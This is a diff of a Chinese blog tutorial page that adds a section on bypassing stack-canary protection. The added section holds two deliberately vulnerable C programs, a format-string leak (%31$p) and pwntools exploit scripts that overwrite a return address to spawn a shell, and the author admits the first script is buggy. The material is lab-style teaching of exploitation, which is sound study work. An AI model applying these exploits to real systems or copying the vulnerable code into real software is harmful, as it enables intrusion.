@@ -298,7 +298,115 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
             </figure>
 
 <p>在没有保护的情况下 利用完毕</p>
-<h2 id="在有Canary保护的情况下的利用"><a href="#在有Canary保护的情况下的利用" class="headerlink" title="在有Canary保护的情况下的利用"></a>在有Canary保护的情况下的利用</h2><script>
+<h2 id="在有Canary保护的情况下的利用"><a href="#在有Canary保护的情况下的利用" class="headerlink" title="在有Canary保护的情况下的利用"></a>在有Canary保护的情况下的利用</h2><p>绕过Canary保护的的方法主要有两种分别都有各自的局限性 </p>
+<p>第一种就是利用程序的格式化字符串漏洞泄漏出指定位置的Canary值 当然 这种方法的前提就是程序中存在格式化字符串漏洞… </p>
+<p>第二种方法就是利用溢出 直接将字符串覆盖到Canary值 然后在输出的时候直接输出出来 这种方法的局限性是要求读入字符串的函数 不会将00加入到字符串尾 不然会直接截断字符串 导致不能将Canary值带出来 </p>
+<p>下面分别给出两种情况的案例 来绕过Canary保护</p>
+<h3 id="配合格式化字符串绕过"><a href="#配合格式化字符串绕过" class="headerlink" title="配合格式化字符串绕过"></a>配合格式化字符串绕过</h3><p>首先给出案例代码</p>
+<pre class=" language-C"><code class="language-C">#include <stdio.h>
+#include<stdlib.h>
+
+void pwn()
+{
+      system("/bin/sh");
+}
+
+int main(void)
+{
+      int sign=0;
+      char a[100];
+      while(!sign)
+      {
+            gets(a);
+          printf("this is out\n");
+            printf(a);
+          printf("\n");
+            scanf("%d",&sign);
+            getchar();
+      }
+}</stdlib.h></stdio.h></code></pre>
+<p>利用格式化字符串的第一步就是需要测出内存中存储的字符串相对于参数的偏移</p>
+<figure class="image-box">
+                <a rel="栈溢出漏洞及利用" href="https://s2.ax1x.com/2019/10/18/KeEsiV.png" title="KeEsiV.png" data-fancybox="images"><img src="https://s2.ax1x.com/2019/10/18/KeEsiV.png" alt="KeEsiV.png" title class></a>
+                <p>KeEsiV.png</p>
+            </figure>
+
+<p>这里可以测出 在我本机的偏移是6 那么将程序载入IDA(或者动态调试 都能达到相同的目的) 可以通过汇编面板看到 Var_c就是Canary值 那么转到主函数的栈图 可以明确看到 输入的参数距离Var_c的距离是 <strong>70-c=0x64</strong> 那么输入的参数距离Canary的参数个数就为 <strong>100(0x64)/4+6=31</strong> 明确我们利用格式化子串的格式化输入为 <strong>%31$p</strong></p>
+<figure class="image-box">
+                <a rel="栈溢出漏洞及利用" href="http://p1.so.qhimgs1.com/t0121dda714c5a6d361.jpg" title data-fancybox="images"><img src="http://p1.so.qhimgs1.com/t0121dda714c5a6d361.jpg" alt title class></a>
+                <p></p>
+            </figure>
+
+<figure class="image-box">
+                <a rel="栈溢出漏洞及利用" href="http://p1.so.qhimgs1.com/t01e714c15cedb1cee0.jpg" title data-fancybox="images"><img src="http://p1.so.qhimgs1.com/t01e714c15cedb1cee0.jpg" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>那下一步就是写脚本了</p>
+<pre class=" language-Python"><code class="language-Python">from pwn import *
+context.log_level='debug'
+
+sh=process("./canary")
+sys_addr=ELF("./canary").symbols['pwn']
+payload = "%31$p"
+sh.sendline(payload)
+sh.recvuntil("this is out\n")
+canary=sh.recvline()[0:-1]
+canary=int(canary,16)
+sh.sendline('0')
+payload2='a'*0x64+p32(canary)+p32(0)+p32(sys_addr)
+#这个脚本这里是有问题的 菜鸡实在不知道怎么把十进制数转成16进制数... 大致思路理解下即可...
+sh.sendline(payload2)
+sh.recvuntil("this is out\n")
+sh.sendline('1')
+sh.interactive()</code></pre>
+<h3 id="溢出覆盖绕过Canary保护"><a href="#溢出覆盖绕过Canary保护" class="headerlink" title="溢出覆盖绕过Canary保护"></a>溢出覆盖绕过Canary保护</h3><p>先给出样例</p>
+<pre class=" language-C"><code class="language-C">#include <stdio.h>
+#include<stdlib.h>
+
+void pwn()
+{
+      system("/bin/sh");
+}
+
+int main(void)
+{
+      int sign=0;
+      char a[100];
+      while(!sign)
+      {
+            read(0,a,100);
+          printf("this is out\n");
+            printf(a);
+          printf("\n");
+            scanf("%d",&sign);
+            getchar();
+      }
+}</stdlib.h></stdio.h></code></pre>
+<p>这个就没有那么多将就 直接载入IDA 看距离 覆盖到Canary值即可</p>
+<p>脚本如下</p>
+<pre class=" language-Python"><code class="language-Python">#coding:utf-8
+from pwn import *
+context.log_level = 'debug'
+context.terminal = ['deepin-terminal', '-x', 'sh' ,'-c']
+r = process("./canary1")
+shell_addr = ELF("./canary1").sym["pwn"]
+payload = "a"*100
+r.sendline(payload)
+r.recvuntil("this is out")
+r.recvuntil("a"*100)
+canary = u32(r.recv(4))-0x0a
+log.info("canary:"+hex(canary))
+r.sendline('0')
+payload =  "a"*100 #填充
+payload += p32(canary)#泄露的canary
+payload += "a"*8
+payload += "aaaa" #ebp
+payload += p32(shell_addr) # ret addr
+r.sendline(payload)
+r.sendline('1')
+r.interactive()</code></pre>
+<script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
             if (!el.dataset.src) { return; }
@@ -316,14 +424,14 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
             });
             document.body.appendChild(img);
           });
-      </script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"22.default"},"display":{"position":"left"},"mobile":{"show":true},"log":false});</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"22.default"},"display":{"position":"left"},"mobile":{"show":true},"log":false});</script>
+      </script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"live2d-widget-model-wanko"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"live2d-widget-model-wanko"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script>
         </div>
         
 <blockquote class="post-copyright">
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2019-10-11T12:46:26.386Z" itemprop="dateUpdated">2019-10-11 20:46:26</time>
+    最后更新时间：<time datetime="2019-10-18T12:12:23.665Z" itemprop="dateUpdated">2019-10-18 20:12:23</time>
 </span><br>
 
 
@@ -405,7 +513,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
         <aside class="post-widget">
             <nav class="post-toc-wrap" id="post-toc">
                 <strong>目录</strong>
-                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#简述漏洞形成"><span class="post-toc-number">1.</span> <span class="post-toc-text">简述漏洞形成</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#敏感函数"><span class="post-toc-number">2.</span> <span class="post-toc-text">敏感函数</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#gets"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">gets()</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#函数原型"><span class="post-toc-number">2.1.1.</span> <span class="post-toc-text">函数原型</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#功能"><span class="post-toc-number">2.1.2.</span> <span class="post-toc-text">功能</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#read"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">read()</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#函数原型-1"><span class="post-toc-number">2.2.1.</span> <span class="post-toc-text">函数原型</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#功能-1"><span class="post-toc-number">2.2.2.</span> <span class="post-toc-text">功能</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#strcpy-和memcpy-和strncpy"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">strcpy()和memcpy()和strncpy()</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#函数原型-2"><span class="post-toc-number">2.3.1.</span> <span class="post-toc-text">函数原型</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#注意"><span class="post-toc-number">2.3.2.</span> <span class="post-toc-text">注意</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#在没有保护的情况下利用"><span class="post-toc-number">3.</span> <span class="post-toc-text">在没有保护的情况下利用</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#在有Canary保护的情况下的利用"><span class="post-toc-number">4.</span> <span class="post-toc-text">在有Canary保护的情况下的利用</span></a></li></ol>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#简述漏洞形成"><span class="post-toc-number">1.</span> <span class="post-toc-text">简述漏洞形成</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#敏感函数"><span class="post-toc-number">2.</span> <span class="post-toc-text">敏感函数</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#gets"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">gets()</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#函数原型"><span class="post-toc-number">2.1.1.</span> <span class="post-toc-text">函数原型</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#功能"><span class="post-toc-number">2.1.2.</span> <span class="post-toc-text">功能</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#read"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">read()</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#函数原型-1"><span class="post-toc-number">2.2.1.</span> <span class="post-toc-text">函数原型</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#功能-1"><span class="post-toc-number">2.2.2.</span> <span class="post-toc-text">功能</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#strcpy-和memcpy-和strncpy"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">strcpy()和memcpy()和strncpy()</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#函数原型-2"><span class="post-toc-number">2.3.1.</span> <span class="post-toc-text">函数原型</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#注意"><span class="post-toc-number">2.3.2.</span> <span class="post-toc-text">注意</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#在没有保护的情况下利用"><span class="post-toc-number">3.</span> <span class="post-toc-text">在没有保护的情况下利用</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#在有Canary保护的情况下的利用"><span class="post-toc-number">4.</span> <span class="post-toc-text">在有Canary保护的情况下的利用</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#配合格式化字符串绕过"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">配合格式化字符串绕过</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#溢出覆盖绕过Canary保护"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">溢出覆盖绕过Canary保护</span></a></li></ol></li></ol>
             </nav>
             <div class="toc-bar"><div>
         </div></div></aside>
@@ -578,6 +686,6 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
 
 
     
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"22.default"},"display":{"position":"left"},"mobile":{"show":true},"log":false});</script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"live2d-widget-model-wanko"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script>
 
 <script type="text/javascript" charset="utf-8" src="/js/lazyload-plugin/lazyload.intersectionObserver.min.js"></script></body></html>
